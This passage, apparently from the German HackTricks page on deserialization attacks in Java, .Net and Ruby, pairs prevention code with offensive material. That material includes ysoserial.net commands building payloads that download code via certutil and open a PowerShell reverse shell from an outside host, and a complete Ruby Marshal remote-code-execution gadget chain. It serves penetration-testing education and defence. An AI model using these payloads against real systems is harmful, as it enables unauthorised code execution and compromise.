Sie k√∂nnen [https://github.com/pwntester/SerialKillerBypassGadgetCollection](https://github.com/pwntester/SerialKillerBypassGadgetCollection) zusammen mit ysoserial verwenden, um mehr Exploits zu erstellen. Weitere Informationen zu diesem Tool finden Sie in den Folien des Vortrags, in dem das Tool vorgestellt wurde: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[marshalsec](https://github.com/mbechler/marshalsec) kann verwendet werden, um Payloads zu generieren, um verschiedene Json- und Yml-Serialisierungsbibliotheken in Java zu exploitieren.\
Um das Projekt zu kompilieren, musste ich diese Abh√§ngigkeiten zur `pom.xml` hinzuf√ºgen:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Installiere Maven** und **kompiliere** das Projekt:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Lesen Sie mehr √ºber diese Java JSON-Bibliothek: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* Wenn Sie einige ysoserial-Payloads testen m√∂chten, k√∂nnen Sie **diese Webanwendung ausf√ºhren**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Warum

Java verwendet Serialization f√ºr verschiedene Zwecke wie:

- **HTTP-Anfragen**: Serialization wird h√§ufig bei der Verwaltung von Parametern, ViewState, Cookies usw. eingesetzt.
- **RMI (Remote Method Invocation)**: Das Java RMI-Protokoll, das ausschlie√ülich auf Serialization basiert, ist ein Eckpfeiler f√ºr die Remote-Kommunikation in Java-Anwendungen.
- **RMI √ºber HTTP**: Diese Methode wird h√§ufig von Java-basierten Thick-Client-Webanwendungen verwendet, die Serialization f√ºr alle Objektkommunikationen nutzen.
- **JMX (Java Management Extensions)**: JMX verwendet Serialization zum √úbertragen von Objekten √ºber das Netzwerk.
- **Benutzerdefinierte Protokolle**: In Java ist es √ºblich, rohe Java-Objekte zu √ºbertragen, was in den kommenden Beispielen f√ºr Exploits demonstriert wird.

### Pr√§vention

#### Transiente Objekte

Eine Klasse, die `Serializable` implementiert, kann jedes Objekt in der Klasse als `transient` implementieren, das nicht serialisierbar sein sollte. Zum Beispiel:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Vermeiden Sie die Serialisierung einer Klasse, die das Serializable-Interface implementieren muss

In Szenarien, in denen bestimmte Objekte aufgrund der Klassenhierarchie das `Serializable`-Interface implementieren m√ºssen, besteht das Risiko einer unbeabsichtigten Deserialisierung. Um dies zu verhindern, stellen Sie sicher, dass diese Objekte nicht deserialisierbar sind, indem Sie eine `final` `readObject()`-Methode definieren, die konsequent eine Ausnahme wirft, wie im folgenden Beispiel gezeigt:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Verbesserung der Deserialisierungssicherheit in Java**

Die Anpassung von `java.io.ObjectInputStream` ist ein praktischer Ansatz zur Absicherung von Deserialisierungsprozessen. Diese Methode ist geeignet, wenn:

- Der Deserialisierungscode unter Ihrer Kontrolle steht.
- Die f√ºr die Deserialisierung erwarteten Klassen bekannt sind.

√úberschreiben Sie die Methode **`resolveClass()`**, um die Deserialisierung nur auf erlaubte Klassen zu beschr√§nken. Dadurch wird die Deserialisierung aller Klassen au√üer denen, die explizit zugelassen sind, verhindert. Im folgenden Beispiel wird die Deserialisierung nur auf die Klasse `Bicycle` beschr√§nkt:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Verwendung eines Java-Agents zur Verbesserung der Sicherheit** bietet eine alternative L√∂sung, wenn eine Code-√Ñnderung nicht m√∂glich ist. Diese Methode gilt haupts√§chlich f√ºr das **Schwarze-Liste setzen sch√§dlicher Klassen** unter Verwendung eines JVM-Parameters:
```
-javaagent:name-of-agent.jar
```
Es bietet eine M√∂glichkeit, die Deserialisierung dynamisch abzusichern, ideal f√ºr Umgebungen, in denen sofortige Code√§nderungen nicht praktikabel sind.

√úberpr√ºfen Sie ein Beispiel in [rO0 von Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)


**Implementierung von Serialisierungsfiltern**: Java 9 f√ºhrte Serialisierungsfilter √ºber das **`ObjectInputFilter`**-Interface ein, das einen leistungsstarken Mechanismus zur Festlegung von Kriterien bietet, die serialisierte Objekte erf√ºllen m√ºssen, bevor sie deserialisiert werden k√∂nnen. Diese Filter k√∂nnen global oder pro Stream angewendet werden und bieten eine granulare Kontrolle √ºber den Deserialisierungsprozess.

Um Serialisierungsfilter zu nutzen, k√∂nnen Sie einen globalen Filter festlegen, der f√ºr alle Deserialisierungsvorg√§nge gilt, oder ihn dynamisch f√ºr bestimmte Streams konfigurieren. Zum Beispiel:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Nutzung externer Bibliotheken zur Verbesserung der Sicherheit**: Bibliotheken wie **NotSoSerial**, **jdeserialize** und **Kryo** bieten erweiterte Funktionen zur Kontrolle und √úberwachung der Deserialisierung in Java. Diese Bibliotheken k√∂nnen zus√§tzliche Sicherheitsebenen bieten, wie z.B. das Whitelisting oder Blacklisting von Klassen, die Analyse serialisierter Objekte vor der Deserialisierung und die Implementierung benutzerdefinierter Serialisierungsstrategien.

- **NotSoSerial** unterbricht den Deserialisierungsprozess, um die Ausf√ºhrung nicht vertrauensw√ºrdigen Codes zu verhindern.
- **jdeserialize** erm√∂glicht die Analyse serialisierter Java-Objekte, ohne sie zu deserialisieren, um potenziell b√∂sartigen Inhalt zu identifizieren.
- **Kryo** ist ein alternatives Serialisierungsframework, das Geschwindigkeit und Effizienz betont und konfigurierbare Serialisierungsstrategien bietet, die die Sicherheit verbessern k√∂nnen.


### Referenzen

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Deserialisierung und ysoserial-Vortrag: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Vortrag √ºber Gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) und Folien: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec-Papier: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java- und .Net-JSON-Deserialisierungs-Papier: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** Vortrag: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) und Folien: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* Deserialisierungs-CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Erfahren Sie, was **JNDI Injection** ist, wie man es √ºber RMI, CORBA & LDAP missbrauchen kann und wie man **log4shell** ausnutzt (und ein Beispiel f√ºr diese Schwachstelle) auf der folgenden Seite:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> Die **Java Message Service** (**JMS**) API ist eine Java message-orientierte Middleware-API zum Senden von Nachrichten zwischen zwei oder mehr Clients. Es handelt sich um eine Implementierung zur L√∂sung des Produzenten-Konsumenten-Problems. JMS ist Teil der Java Platform, Enterprise Edition (Java EE) und wurde durch eine Spezifikation entwickelt, die bei Sun Microsystems entstanden ist, aber seitdem vom Java Community Process geleitet wird. Es handelt sich um einen Messaging-Standard, der es Anwendungskomponenten auf Basis von Java EE erm√∂glicht, Nachrichten zu erstellen, zu senden, zu empfangen und zu lesen. Es erm√∂glicht die Kommunikation zwischen verschiedenen Komponenten einer verteilten Anwendung, die lose gekoppelt, zuverl√§ssig und asynchron ist. (Aus [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Produkte

Es gibt mehrere Produkte, die diese Middleware zum Senden von Nachrichten verwenden:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (291).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (292).png>)

### Ausnutzung

Im Grunde gibt es eine **Reihe von Diensten, die JMS auf gef√§hrliche Weise verwenden**. Wenn Sie also **ausreichende Berechtigungen** haben, um Nachrichten an diese Dienste zu senden (in der Regel ben√∂tigen Sie g√ºltige Anmeldeinformationen), k√∂nnen Sie in der Lage sein, **b√∂sartige Objekte zu senden, die serialisiert werden und vom Verbraucher/Abonnenten deserialisiert werden**.\
Das bedeutet, dass bei dieser Ausnutzung alle **Clients, die diese Nachricht verwenden, infiziert werden**.

Sie sollten bedenken, dass Sie auch bei einem anf√§lligen Dienst (weil er unsicher Benutzereingaben deserialisiert) immer noch g√ºltige Gadgets finden m√ºssen, um die Schwachstelle auszunutzen.

Das Tool [JMET](https://github.com/matthiaskaiser/jmet) wurde entwickelt, um **diese Dienste zu verbinden und anzugreifen, indem mehrere b√∂sartige Objekte serialisiert und bekannte Gadgets verwendet werden**. Diese Exploits funktionieren, wenn der Dienst immer noch anf√§llig ist und wenn eines der verwendeten Gadgets in der anf√§lligen Anwendung vorhanden ist.

### Referenzen

* JMET-Vortrag: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Folien: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

Im Kontext von .Net arbeiten Deserialisierungsexploits √§hnlich wie in Java, bei denen Gadgets ausgenutzt werden, um w√§hrend der Deserialisierung eines Objekts bestimmten Code auszuf√ºhren.
### Fingerprint

#### WhiteBox

Der Quellcode sollte auf das Vorhandensein von Folgendem √ºberpr√ºft werden:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Der Fokus sollte auf Serialisierern liegen, die es erm√∂glichen, den Typ anhand einer vom Benutzer kontrollierten Variablen zu bestimmen.

#### BlackBox

Die Suche sollte auf den Base64-kodierten String **AAEAAAD/////** oder ein √§hnliches Muster abzielen, das auf der Serverseite deserialisiert werden k√∂nnte und die Kontrolle √ºber den zu deserialisierenden Typ gew√§hrt. Dies k√∂nnte JSON- oder XML-Strukturen umfassen, die `TypeObject` oder `$type` enthalten.

### ysoserial.net

In diesem Fall k√∂nnen Sie das Tool [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) verwenden, um die Deserialisierungs-Exploits zu erstellen. Sobald Sie das Git-Repository heruntergeladen haben, sollten Sie das Tool mit Visual Studio oder einem √§hnlichen Programm **kompilieren**.

Wenn Sie erfahren m√∂chten, **wie ysoserial.net seinen Exploit erstellt**, k√∂nnen Sie [**diese Seite √ºberpr√ºfen, auf der der ObjectDataProvider-Gadget + ExpandedWrapper + Json.Net-Formatter erkl√§rt wird**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Die Hauptoptionen von **ysoserial.net** sind: **`--gadget`**, **`--formatter`**, **`--output`** und **`--plugin`.**

* **`--gadget`** wird verwendet, um das Gadget anzugeben, das ausgenutzt werden soll (geben Sie die Klasse/Funktion an, die w√§hrend der Deserialisierung missbraucht wird, um Befehle auszuf√ºhren).
* **`--formatter`** wird verwendet, um die Methode anzugeben, mit der der Exploit serialisiert wird (Sie m√ºssen wissen, welche Bibliothek vom Backend zum Deserialisieren der Nutzlast verwendet wird und dieselbe zum Serialisieren verwenden).
* **`--output`** wird verwendet, um anzugeben, ob der Exploit im **rohen** oder **Base64-kodierten** Format ausgegeben werden soll. Beachten Sie, dass **ysoserial.net** die Nutzlast mit **UTF-16LE** (Standard-Encoding in Windows) kodiert. Wenn Sie das Rohformat erhalten und es nur von einer Linux-Konsole aus kodieren, k√∂nnen Probleme mit der **Encoding-Kompatibilit√§t** auftreten, die verhindern, dass der Exploit ordnungsgem√§√ü funktioniert (im HTB JSON-Box funktionierte die Nutzlast sowohl in UTF-16LE als auch in ASCII, aber das bedeutet nicht, dass es immer funktioniert).
* **`--plugin`** ysoserial.net unterst√ºtzt Plugins, um **Exploits f√ºr bestimmte Frameworks** wie ViewState zu erstellen.

#### Weitere Parameter f√ºr ysoserial.net

* `--minify` liefert eine **kleinere Nutzlast** (falls m√∂glich)
* `--raf -f Json.Net -c "anything"` Hier werden alle Gadgets angezeigt, die mit einem angegebenen Formatter (`Json.Net` in diesem Fall) verwendet werden k√∂nnen.
* `--sf xml` Sie k√∂nnen ein Gadget (`-g`) angeben und ysoserial.net sucht nach Formattern, die "xml" (Gro√ü-/Kleinschreibung wird nicht beachtet) enthalten.

**Beispiele f√ºr ysoserial.net**, um Exploits zu erstellen:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** hat auch einen sehr interessanten Parameter, der dabei hilft, besser zu verstehen, wie jeder Exploit funktioniert: `--test`. Wenn du diesen Parameter angibst, wird **ysoserial.net** den Exploit lokal ausprobieren, damit du testen kannst, ob dein Payload korrekt funktioniert. Dieser Parameter ist hilfreich, weil du im Code Codeabschnitte wie den folgenden finden wirst (aus [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Dies bedeutet, dass zum Testen des Exploits der Code [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) aufrufen wird.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
Im **vorherigen Code ist anf√§llig f√ºr den erstellten Exploit**. Wenn Sie also etwas √Ñhnliches in einer .Net-Anwendung finden, bedeutet dies wahrscheinlich, dass diese Anwendung ebenfalls anf√§llig ist.
Daher erm√∂glicht uns der Parameter **`--test`**, zu verstehen, **welche Codeabschnitte anf√§llig** f√ºr den Deserialisierungs-Exploit sind, den **ysoserial.net** erstellen kann.

### ViewState

Werfen Sie einen Blick auf [diesen POST √ºber **wie man versucht, den \_\_ViewState-Parameter von .Net zu exploitieren**](exploiting-\_\_viewstate-parameter.md), um **beliebigen Code auszuf√ºhren**. Wenn Sie **bereits die Geheimnisse** kennen, die von der Opfermaschine verwendet werden, [**lesen Sie diesen Beitrag, um zu wissen, wie man Code ausf√ºhrt**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Pr√§vention

Um die mit der Deserialisierung in .Net verbundenen Risiken zu mindern:

- **Vermeiden Sie es, Datenstr√∂men zu erlauben, ihre Objekttypen zu definieren**. Verwenden Sie `DataContractSerializer` oder `XmlSerializer`, wenn m√∂glich.

- **F√ºr `JSON.Net` setzen Sie `TypeNameHandling` auf `None`:**
%%%TypeNameHandling = TypeNameHandling.None%%%

- **Verwenden Sie `JavaScriptSerializer` nicht mit einem `JavaScriptTypeResolver`.**

- **Beschr√§nken Sie die Typen, die deserialisiert werden k√∂nnen**, und verstehen Sie die inh√§renten Risiken bei .Net-Typen wie `System.IO.FileInfo`, die die Eigenschaften von Serverdateien √§ndern k√∂nnen und m√∂glicherweise zu Denial-of-Service-Angriffen f√ºhren.

- **Seien Sie vorsichtig bei Typen mit riskanten Eigenschaften**, wie z.B. `System.ComponentModel.DataAnnotations.ValidationException` mit ihrer `Value`-Eigenschaft, die ausgenutzt werden kann.

- **Kontrollieren Sie die sichere Instanziierung von Typen**, um zu verhindern, dass Angreifer den Deserialisierungsprozess beeinflussen und selbst `DataContractSerializer` oder `XmlSerializer` angreifbar machen.

- **Implementieren Sie Whitelist-Steuerungen** mit einem benutzerdefinierten `SerializationBinder` f√ºr `BinaryFormatter` und `JSON.Net`.

- **Bleiben Sie √ºber bekannte unsichere Deserialisierungsgadgets** in .Net informiert und stellen Sie sicher, dass Deserialisierer solche Typen nicht instanziieren.

- **Isolieren Sie potenziell riskanten Code** von Code mit Internetzugang, um bekannte Gadgets wie `System.Windows.Data.ObjectDataProvider` in WPF-Anwendungen vor nicht vertrauensw√ºrdigen Datenquellen zu sch√ºtzen.

### **Referenzen**

* Java- und .Net-JSON-Deserialisierungs-**Dokumentation**: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** Vortrag: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) und Folien: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

In Ruby wird die Serialisierung durch zwei Methoden in der **marshal**-Bibliothek erleichtert. Die erste Methode, bekannt als **dump**, wird verwendet, um ein Objekt in einen Byte-Stream zu transformieren. Dieser Vorgang wird als Serialisierung bezeichnet. Umgekehrt wird die zweite Methode, **load**, verwendet, um einen Byte-Stream wieder in ein Objekt umzuwandeln, ein Vorgang, der als Deserialisierung bekannt ist.

Zur Sicherung serialisierter Objekte verwendet **Ruby HMAC (Hash-Based Message Authentication Code)**, um die Integrit√§t und Authentizit√§t der Daten zu gew√§hrleisten. Der f√ºr diesen Zweck verwendete Schl√ºssel wird an einem der m√∂glichen Speicherorte gespeichert:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generische Deserialisierung zu RCE-Gadget-Kette (weitere Informationen unter [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/))**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Andere RCE-Kette zur Ausnutzung von Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) **bei oder folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden.**

</details>
